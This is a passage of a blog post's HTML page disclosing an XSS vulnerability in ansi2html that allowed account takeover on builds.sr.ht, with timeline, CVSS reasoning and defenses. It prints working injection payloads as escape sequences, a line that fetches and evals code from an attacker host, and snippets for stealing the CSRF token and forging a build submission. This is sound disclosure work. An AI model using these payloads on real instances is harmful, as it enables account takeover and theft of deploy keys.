@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>SourceHut account takeover via build logs (XSS in ansi2html.py) | CVE-2026-92973 | Arusekk blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="A wormable vulnerability allowed anyone able to inject text in a build log on builds.sr.ht (or other instances) to take over accounts who viewed them">
+<meta name="author" content="Arusekk">
+<link rel="canonical" href="https://blog.arusekk.pl/posts/srht-account-takeover/">
+<meta name="google-site-verification" content="bYg8j9Mad2AS5t14kMMccNgC-2zDjGk48iuoGhFvXe0">
+<meta name="msvalidate.01" content="561966B916832399DDA58ED4584121A9">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.aeb04085357f24835232aa89766467110fb6da019fa0a790d4d097b3949d7276.css" integrity="sha256-rrBAhTV/JINSMqqJdmRnEQ&#43;22gGfoKeQ1NCXs5SdcnY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://blog.arusekk.pl/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://blog.arusekk.pl/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://blog.arusekk.pl/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://blog.arusekk.pl/apple-touch-icon.png">
+<link rel="mask-icon" href="https://blog.arusekk.pl/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://blog.arusekk.pl/posts/srht-account-takeover/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://blog.arusekk.pl/posts/srht-account-takeover/">
+  <meta property="og:site_name" content="Arusekk blog">
+  <meta property="og:title" content="SourceHut account takeover via build logs (XSS in ansi2html.py) | CVE-2026-92973">
+  <meta property="og:description" content="A wormable vulnerability allowed anyone able to inject text in a build log on builds.sr.ht (or other instances) to take over accounts who viewed them">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-09-23T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-09-23T00:00:00+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SourceHut account takeover via build logs (XSS in ansi2html.py) | CVE-2026-92973">
+<meta name="twitter:description" content="A wormable vulnerability allowed anyone able to inject text in a build log on builds.sr.ht (or other instances) to take over accounts who viewed them">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://blog.arusekk.pl/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "SourceHut account takeover via build logs (XSS in ansi2html.py) | CVE-2026-92973",
+      "item": "https://blog.arusekk.pl/posts/srht-account-takeover/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SourceHut account takeover via build logs (XSS in ansi2html.py) | CVE-2026-92973",
+  "name": "SourceHut account takeover via build logs (XSS in ansi2html.py) | CVE-2026-92973",
+  "description": "A wormable vulnerability allowed anyone able to inject text in a build log on builds.sr.ht (or other instances) to take over accounts who viewed them",
+  "keywords": [
+    
+  ],
+  "articleBody": "Welcome to my first big impact vulnerability writeup!\nI like good stories, so let me describe some background first. I recently had a ‘great’ idea (I know, I know, I should stop having these) to set up a sr.ht instance that would pay people for hosting their projects. You can find it shamelessly plugged in the timeline section, in case you want to try it or flame me for it on socials.\nAnyway, the story. The first step was to clone some minimal subset of the sr.ht repos, and start hacking on it.\nNo NLP I tend to include the following statement in my vulnerability research submissions from this year. Make from it what you wish.\nNo NLP has been used in this research. The mistakes are all mine.\nStructure SourceHut is structured in several microservices, the main ones being meta.sr.ht and probably git.sr.ht or hub.sr.ht (the flagship instance hosts it at just sr.ht). And of course builds.sr.ht, the CI.\nOne less known is mirror.sr.ht (slowly moving to mirror.srht.network), containing prebuilt packages for various microservices.\nI must say I like this approach, because it allows a very easy start on any machine matching the flagship instance distro version exactly.\nIf your favourite project currently recommends installation via curl|sudo bash or ‘just launch Claude in this folder’ (sic!), please consider making yourself aware of the not less valid option of distributing software to end users using actual software packages instead.1\nBuilding Alpine packages So if you happen to use a different distro, or even a different version of Alpine, you are on your own a bit. So there is the sr.ht-apkbuilds repo, and you can ‘fork’ it to use your signing key, your Alpine version and your mirror. There is also sr.ht-pkgbuilds for Arch, but it’s effectively unmaintained at this point.2\nThis involves using builds.sr.ht to bootstrap the packages. I tried to look at the page source of the build log, because it kept scrolling not where I wanted, which annoyed me a bit.\nThat’s when I found this:\n/* ... */ .ansi38-150150150 { color: #969696; } .ansi38-150150150 { color: #969696; } .ansi38-150150150 { color: #969696; } .ansi38-150150150 { color: #969696; } .ansi38-150150150 { color: #969696; } .ansi38-150150150 { color: #969696; } .ansi38-150150150 { color: #969696; } .ansi38-150150150 { color: #969696; } .ansi38-150150150 { color: #969696; } .ansi38-150150150 { color: #969696; } .ansi38-150150150 { color: #969696; } /* ... */ I decided to take a closer look how it’s done, and maybe fix it. Look, I like SourceHut. I can see there is quite some wasted compute and bandwidth here. I want them to get rich so that others follow suit, and there is some unnecessary waste slowing that.3\nansi2html I took a look into the logic converting ANSI escape codes to HTML, and I filed an issue for it. There has been no activity in the repo for over a year at that point, so I decided to work on it, because I like receiving good patches myself, when I am not focused on a particular project. This quickly resulted in submitting a PR fixing this particular issue.\nGiven my Capture The Flag background, I started looking into ansi2html a bit more, in hunt for more bugs (especially that I’m about to host it myself!). Apart from parsing escape sequences for colors, it also allows for automatic links, and OSC 8 hyperlinks. Because the code is not so well-structured yet, I was able to craft a malicious input string after reading this great XSS cheatsheet (now forever in my bookmarks):\n$ printf '\\33]8;;https://example.com/\"/autofocus/tabindex=\"1\"/onfocus=\"alert`xss`\\7Nothing to see here\\33]8;;\\7' | ansi2html [...] \u003ca href=\"https://example.com/\"/autofocus/tabindex=\"1\"/onfocus=\"alert`xss`\"\u003eNothing to see here\u003c/a\u003e [...] $ printf '\\33]8;;javascript:alert`xss`\\7Nothing to see here\\33]8;;\\7' | ansi2html [...] \u003ca href=\"javascript:alert`xss`\"\u003eNothing to see here\u003c/a\u003e [...] The former is worth some explanation. No idea why, but as you can check, it parses to the same DOM tree as:\n\u003ca href=\"https://example.com/\" autofocus tabindex=\"1\" onfocus=\"alert`xss`\"\u003e Nothing to see here \u003c/a\u003e So if you happen to be able to make ␛]8;;https://example.com/\"/...␇ appear in the job logs —4 which you can, either without even having an account, by sending a patch to a public mailing list with continuous integration turned on, or by controlling any remote resource that happens to be printed to the log — congratulations, you have just created a build job at https://builds.sr.ht/~someone-else/job/1234567 that executes your payload in every browser that views it. You can submit the job yourself, but this requires a paid account on the flagship instance. And there are no anonymous payments currently there.\nWeaponizing (do not try this at home) The actual payload can be downloaded from an attacker’s website, like eval(await (await fetch('https://example.com')).text()) but here’s some speculation about what it could do.\nThe build log page already contains the CSRF token. You can read it with document.querySelector('[name=_csrf_token]').value for example, or just use the existing form (part of the ‘Resubmit build’ button), like document.querySelector('[name=manifest]').value=`something`;document.forms[0].submit(). Once you get an admin to view it, you can probably grant yourself admin rights. The worse impact is that you have access to all the deploy keys, and on builds.sr.ht, there are deploy keys for sr.ht itself (probably not the case with other instances).\nMaking this part of the payload is left as an exercise for the curious reader. I cannot stress this enough: remember to only test worms on your own infrastructure. And never on production. Even if it’s your production.\nHow to do defense in depth here? By restricting Content-Security-Policy. I’m no expert here, but removing ‘unsafe-inline’ would be a good first step (not useful advice in itself, because inline scripts are currently used even on the build log page itself, for scrolling).\nBy extra sanitization (SourceHut added it, but it’s overzealous - now there are no colors!).\nAnd by restructuring the code in ansi2html into some stateful transducer automaton thing.\nContact I immediately emailed ~sircmpwn/sr.ht-security@lists.sr.ht explaining the entire problem, complete with a fix that mitigated the worst part at least.\nDrew (can I call you Drew? I guess we are all brothers in Source) ended up patching builds.sr.ht to auto-sanitize the output from ansi2html instead. Also a good choice.\nUpstream Then I contacted upstream (maybe a bit too late? exact timeline below). Ansi2html is one of the projects featured in the famous and by now beaten to death comic strip by Randall Munroe.5 Placed under pycontribs org on GitHub, which ominously states:\nPyContribs main purpose is to assure that different Python-related projects remain maintained.\nI reached out to the two top people from last 5 or so years’ worth of contributor graph, emails from git history, in order not to make the issue public yet, although it was already made public by the SourceHut announcement.\nThe maintainer I believed to be the ‘main’ one (Sorin Sbarnea) has not replied to date (he might be having some kind of holiday), although the other one (Sebastian Pipping) has. And the message was a cryptic, unusual for me to receive, ‘mail me in two weeks’.\nSo I patiently waited two weeks, minding my another nascent business (let me try, okay?), and sent the email.\nHelping upstream It turned out that Sebastian (can I call you Sebastian?) is a cool guy and he figured he needed me to help him because of something with ACLs on the repo. We ended up getting ansi2html up from the suspension it was in, updating some obsolete scripts, and releasing like 3 or 4 versions of ansi2html to PyPI together.\nI tried to be helpful, but had some things going on with my PhD-in-spe, so some latency crept in.\nSubmitting for a CVE Let’s start with the hot take that CVSS scoring is a fallacy: it should be separate for each product and not just one for one root cause code path.\nThe purpose of CVSS is after all to provide useful information to downstream users on whether to go patch it or not. Researchers have the incentive to make it as high as possible. And projects have the incentive to downplay it. They do want to fix it, but they want to avoid the paperwork involved, and the confidentiality dance of passing it all around (and I totally get it!).\nThe problem is, not all software is born equal, and this is especially the case with libraries like libcurl.\nCVSS 4.0 is at least a bit better than CVSS 3.x. It now makes a distinction on Vulnerable System and Subsequent System. In case of XSS vulnerabilities the typical approach is to say that the web service is Vulnerable, and the browser is Subsequent (which kind of makes sense, because the bug is in the service, but then it impacts the victim browser first in order to attack the web service itself again).\nThe vector I initially came up with has been altered by VulnCheck. Not sure why, but maybe it can be changed back? Or maybe not worth bothering. Let me know what you think. I also want to add this blog post to the CVE DB, but I might need to check how to do it.\nAV:N - attack vector: network AC:L - attack complexity: low (no guesswork required, no need to bypass or synchronize attacks) AT:N - requirements: none (as opposed to specific config required) PR:N - privileges required: none (just send an email? it might also be low if there was no lists.sr.ht) UI:P - user interaction: passive (the victim must visit a site with JS on - the only problem, easy to solve) vulnerable system (builds.sr.ht / all of sr.ht)\nVC:H - confidentiality impact: high (does cause a direct, serious loss of confidentiality - secrets get exposed) VI:H - integrity impact: high (can submit malicious build jobs as victim with access to deploy keys) VA:N - availability impact: none (cannot take down the whole service, unless clogging build workers counts) subsequent system (victim browser)\nSC:L - confidentiality: low (limited access to tightly scoped secrets) SI:L - integrity: low (ability to forge tightly scoped requests) SA:N - availability: none (nothing more than from a direct visit) supplemental\nAU:Y - automatable: yes (wormable - a victim can attack others right away, spreading the scope) R:I - recovery: irrecoverable (users cannot delete build jobs, only hide them) V:C - value density: concentrated (a single instance hosts many valuable projects with valuable deploy secrets) RE:L - response effort: low (basic mitigation: CSP header insertion at proxy level) U:Amber - urgency: amber (moderate urgency: poses direct danger to infra but has been sitting there for years) While the exact impact can and should be disputed by actual users (after all, SourceHut boasts working just fine without javascript), I would argue for high or critical, not just a mere medium, because if I were a blackhat, it would suffice that Drew visited an affected build log with JS turned on, and I could submit a build job in his name with access to SourceHut deploy keys. Not sure how I would turn that into money or get away with it though. Don’t do this, kids. No excitement justifies it.\nVulnerabile versions ansi2html \u003e=1.7.0, \u003c1.9.4, builds.sr.ht \u003e= 0.40.0, \u003c 0.105.1\nIndicators of compromise Check your raw build logs for ␛]8;;https://example.com/\"/...␇ or ␛]8;;javascript:...␇. In Bash, that would probably be something along grep $'\\33]8;[^\\7\\33]*\"' for the former.\nFull timeline (glad to have permanent records on everything!) I’m not so proud of this timeline, but hey, at least everything is fixed now and there are no (?) records of people trying to use it. I will include the official Arch Linux repo and the sr.ht Alpine Linux repo, because both systems were recommended at one point.\n2019-03-11: ansi2html gets added to builds.sr.ht and then to sr.ht-apkbuilds 2021-09-03: the bug gets introduced to upstream ansi2html 2022-02-08: an affected version gets packaged for Alpine and goes live on the flagship instance 2022-07-10: an affected version is packaged for Arch Linux 2026-07-17: I maybe buy some domains6 2026-07-31: I start working on SourceHut 2026-08-01: I submit the issue, and the PR fixing the TrueColor bug to ansi2html upstream. I prepare a preliminary patch for ansi2html and send it to ~sircmpwn/sr.ht-security@lists.sr.ht. 2026-08-04: the bug gets mitigated in builds.sr.ht code; I receive an email from Drew DeVault confirming the vulnerability. Drew gives me a public shoutout (thanks! I appreciate it!). 2026-08-06: bug reported upstream, ACKed immediately 2026-08-20: pinging upstream 2026-08-22: Sebastian replies, we set up when to work on it 2026-08-24: trying to oil ansi2html CI together before we can proceed to address the actual vulnerability 2026-08-29: version 1.9.3 published, not fixing the vulnerability 2026-08-31: I hint in a post that I am working on a software forge that pays project owners 2026-09-02: PR with the final fix pushed and 1.9.4 published, fixing the vulnerability 2026-09-05: Arch Linux updates ansi2html to a fixed version 2026-09-xx: Life happens, I took a bit more work to sustain myself 2026-09-23: This blog post (actually -09-24 because it’s past midnight by now. sigh.) 2077-??-??: Profit…? Note how even carefully auditing ansi2html would not save SourceHut, unless redone on every bump. builds.sr.ht remained vulnerable for (almost exactly) 4,5 years.\nThanks God for keeping the blackhat temptations away. Danonek123 for keeping me company. I love you.\nSummary See, vulnerability research does not need to be a circus, or security theatre, or a lawyered-up fight against bureaucracy. But then you might not end up better off.\nExcluding CTFs \u0026 invitations to minor conferences (and being allowed to do some VR as part of my internship back when at Antmicro, which I am still grateful for), I have made a metric 0.00€ (that’s $0.00 Fahrenheit) from my vulnerability research so far. If you want to support me (so that I have more time for VR), consider buying something. I like it better than donations (though they are fine too!). I’m also available for professional security consulting.\nI’m not done! There’s more coming, although arguably not so critical. Subscribe to my RSS if you don’t want to miss it.\nOr at least provide some optional ultra-simple configure script that allows to just run make install/ninja install so that other people can package it easily. (By the way, I still can’t get it why people use AppImage instead of just a static binary.) ↩︎\nYou can still probably send your patches if you want to host your sr.ht on Arch! ↩︎\nHey Drew/Conrad/Simon/(sorry if I missed someone!), when you update ansi2html in sr.ht-apkbuilds, actually when you first restart builds.sr.ht after that, please measure the bandwidth impact on builds.sr.ht. I will make sure to link it here. ↩︎\nYes, that’s an em dash. I use Polish typography here, because I have no editor to answer to. Feel free to correct me, though. You can be my drive-by editor. ↩︎\nOops, sorry, wrong link. I’m talking about https://xkcd.com/2347/ of course. ↩︎\nTotally not an impulse buy. ‘To get a sense of being invested.’ I tell to myself. ↩︎\n",
+  "wordCount" : "2467",
+  "inLanguage": "en",
+  "datePublished": "2026-09-23T00:00:00Z",
+  "dateModified": "2026-09-23T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Arusekk"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://blog.arusekk.pl/posts/srht-account-takeover/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Arusekk blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://blog.arusekk.pl/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://blog.arusekk.pl/" accesskey="h" title="Arusekk blog (Alt + H)">Arusekk blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                    <li>
+                        <a href="https://blog.arusekk.pl/pl/" title="🇵🇱 PL"
+                            aria-label=":flag_pl: PL">🇵🇱 PL</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://blog.arusekk.pl/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.arusekk.pl/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.arusekk.pl/contact/" title="Contact">
+                    <span>Contact</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.arusekk.pl/blogroll/" title="Blogroll">
+                    <span>Blogroll</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://blog.arusekk.pl/posts/index.xml" title="Feed">
+                    <span>Feed</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      SourceHut account takeover via build logs (XSS in ansi2html.py) | CVE-2026-92973
+    </h1>
+    <div class="post-description">
+      A wormable vulnerability allowed anyone able to inject text in a build log on builds.sr.ht (or other instances) to take over accounts who viewed them
+    </div>
+    <div class="post-meta"><span title='2026-09-23 00:00:00 +0000 UTC'>September 23, 2026</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;Arusekk
+
+</div>
+  </header> 
+  <div class="post-content"><p>Welcome to my first big impact vulnerability writeup!</p>
+<p>I like good stories, so let me describe some background first.
+I recently had a &lsquo;great&rsquo; idea (I know, I know, I should stop having these) to set up a sr.ht instance
+that would <em>pay</em> people for hosting their projects.
+You can find it shamelessly plugged in the timeline section,
+in case you want to try it or flame me for it on socials.</p>
+<p>Anyway, the story.
+The first step was to clone some minimal subset of the sr.ht repos, and start hacking on it.</p>
+<h2 id="no-nlp">No NLP<a hidden class="anchor" aria-hidden="true" href="#no-nlp">#</a></h2>
+<p>I tend to include the following statement in my vulnerability research submissions from this year.
+Make from it what you wish.</p>
+<p><em>No NLP has been used in this research. The mistakes are all mine.</em></p>
+<h2 id="structure">Structure<a hidden class="anchor" aria-hidden="true" href="#structure">#</a></h2>
+<p><a href="https://sr.ht/~sircmpwn/sourcehut">SourceHut</a> is structured in several microservices,
+the main ones being meta.sr.ht and probably git.sr.ht
+or hub.sr.ht (the flagship instance hosts it at just sr.ht).
+And of course builds.sr.ht, the CI.</p>
+<p>One less known is mirror.sr.ht (slowly moving to mirror.srht.network),
+containing prebuilt packages for various microservices.</p>
+<p>I must say I like this approach, because it allows a very easy start on any machine
+matching the flagship instance distro version exactly.</p>
+<p>If your favourite project currently recommends installation via <code>curl|sudo bash</code>
+or &lsquo;just launch Claude in this folder&rsquo; (sic!),
+please consider making yourself aware of the not less valid option
+of distributing software to end users using actual software packages instead.<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
+<h2 id="building-alpine-packages">Building Alpine packages<a hidden class="anchor" aria-hidden="true" href="#building-alpine-packages">#</a></h2>
+<p>So if you happen to use a different distro,
+or even a different version of Alpine,
+you are on your own a bit.
+So there is the <code>sr.ht-apkbuilds</code> repo,
+and you can &lsquo;fork&rsquo; it to use your signing key,
+your Alpine version and your mirror.
+There is also <code>sr.ht-pkgbuilds</code> for Arch,
+but it&rsquo;s effectively unmaintained at this point.<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup></p>
+<p>This involves using builds.sr.ht to bootstrap the packages.
+I tried to look at the page source of the build log,
+because it kept scrolling not where I wanted,
+which annoyed me a bit.</p>
+<p>That&rsquo;s when I found this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#75715e">/* ... */</span>
+</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">ansi38-150150150</span> { <span style="color:#66d9ef">color</span>: <span style="color:#ae81ff">#969696</span>; }
+</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">ansi38-150150150</span> { <span style="color:#66d9ef">color</span>: <span style="color:#ae81ff">#969696</span>; }
+</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">ansi38-150150150</span> { <span style="color:#66d9ef">color</span>: <span style="color:#ae81ff">#969696</span>; }
+</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">ansi38-150150150</span> { <span style="color:#66d9ef">color</span>: <span style="color:#ae81ff">#969696</span>; }
+</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">ansi38-150150150</span> { <span style="color:#66d9ef">color</span>: <span style="color:#ae81ff">#969696</span>; }
+</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">ansi38-150150150</span> { <span style="color:#66d9ef">color</span>: <span style="color:#ae81ff">#969696</span>; }
+</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">ansi38-150150150</span> { <span style="color:#66d9ef">color</span>: <span style="color:#ae81ff">#969696</span>; }
+</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">ansi38-150150150</span> { <span style="color:#66d9ef">color</span>: <span style="color:#ae81ff">#969696</span>; }
+</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">ansi38-150150150</span> { <span style="color:#66d9ef">color</span>: <span style="color:#ae81ff">#969696</span>; }
+</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">ansi38-150150150</span> { <span style="color:#66d9ef">color</span>: <span style="color:#ae81ff">#969696</span>; }
+</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">ansi38-150150150</span> { <span style="color:#66d9ef">color</span>: <span style="color:#ae81ff">#969696</span>; }
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* ... */</span>
+</span></span></code></pre></div><p>I decided to take a closer look how it&rsquo;s done,
+and maybe fix it.
+Look, I like SourceHut.
+I can see there is quite some wasted compute and bandwidth here.
+I want them to get rich so that others follow suit,
+and there is some unnecessary waste slowing that.<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup></p>
+<h2 id="ansi2html">ansi2html<a hidden class="anchor" aria-hidden="true" href="#ansi2html">#</a></h2>
+<p>I took a look into the logic converting <a href="https://en.wikipedia.org/wiki/ANSI_escape_code">ANSI escape codes</a> to HTML,
+and <a href="https://github.com/pycontribs/ansi2html/issues/259">I filed an issue for it</a>.
+There has been no activity in the repo for over a year at that point,
+so I decided to work on it, because I like receiving good patches myself,
+when I am not focused on a particular project.
+This quickly resulted in submitting <a href="https://github.com/pycontribs/ansi2html/pull/260">a PR fixing this particular issue</a>.</p>
+<p>Given my Capture The Flag background,
+I started looking into ansi2html a bit more,
+in hunt for more bugs (especially that I&rsquo;m about to host it myself!).
+Apart from parsing escape sequences for colors,
+it also allows for automatic links, and <a href="https://en.wikipedia.org/wiki/ANSI_escape_code#Operating_System_Command_sequences">OSC 8 hyperlinks</a>.
+<a href="https://lexi-lambda.github.io/blog/2019/11/05/parse-don-t-validate/">Because the code is not so well-structured yet</a>,
+I was able to craft a malicious input string after reading
+<a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">this great XSS cheatsheet</a> (now forever in my bookmarks):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>$ printf &#39;\33]8;;https://example.com/&#34;/autofocus/tabindex=&#34;1&#34;/onfocus=&#34;alert`xss`\7Nothing to see here\33]8;;\7&#39; | ansi2html
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://example.com/&#34;</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">autofocus</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">tabindex</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">onfocus</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert`xss`&#34;</span>&gt;Nothing to see here&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span>$ printf &#39;\33]8;;javascript:alert`xss`\7Nothing to see here\33]8;;\7&#39; | ansi2html
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:alert`xss`&#34;</span>&gt;Nothing to see here&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>[...]
+</span></span></code></pre></div><p>The former is worth some explanation.
+No idea why, but as you can check, it parses to the same DOM tree as:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://example.com/&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">autofocus</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">tabindex</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">onfocus</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert`xss`&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  Nothing to see here
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span></code></pre></div><p>So if you happen to be able to make <code>␛]8;;https://example.com/&quot;/...␇</code> appear in the job logs
+—<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup> which you can, either without even having an account,
+by sending a patch to a public mailing list with continuous integration turned on,
+or by controlling any remote resource that happens to be printed to the log — congratulations,
+you have just created a build job at <code>https://builds.sr.ht/~someone-else/job/1234567</code>
+that executes your payload in every browser that views it.
+You can submit the job yourself, but this requires a paid account on the flagship instance.
+And there are no anonymous payments currently there.</p>
+<h2 id="weaponizing-do-not-try-this-at-home">Weaponizing (do not try this at home)<a hidden class="anchor" aria-hidden="true" href="#weaponizing-do-not-try-this-at-home">#</a></h2>
+<p>The actual payload can be downloaded from an attacker&rsquo;s website,
+like <code>eval(await (await fetch('https://example.com')).text())</code>
+but here&rsquo;s some speculation about what it could do.</p>
+<p>The build log page already contains the CSRF token.
+You can read it with <code>document.querySelector('[name=_csrf_token]').value</code> for example,
+or just use the existing form (part of the &lsquo;Resubmit build&rsquo; button),
+like <code>document.querySelector('[name=manifest]').value=`something`;document.forms[0].submit()</code>.
+Once you get an admin to view it, you can probably grant yourself admin rights.
+The worse impact is that you have access to all the deploy keys,
+and on builds.sr.ht, there are deploy keys for sr.ht itself
+(probably not the case with other instances).</p>
+<p>Making this part of the payload is left as an exercise for the curious reader.
+I cannot stress this enough: remember to only test worms on your own infrastructure.
+And never on production. Even if it&rsquo;s your production.</p>
+<h2 id="how-to-do-defense-in-depth-here">How to do defense in depth here?<a hidden class="anchor" aria-hidden="true" href="#how-to-do-defense-in-depth-here">#</a></h2>
+<p>By restricting Content-Security-Policy.
+I&rsquo;m no expert here, but removing &lsquo;unsafe-inline&rsquo; would be a good first step
+(not useful advice in itself, because inline scripts are currently used
+even on the build log page itself, for scrolling).</p>
+<p>By extra sanitization (SourceHut added it, but it&rsquo;s overzealous - now there are no colors!).</p>
+<p>And by restructuring the code in ansi2html into some stateful transducer automaton thing.</p>
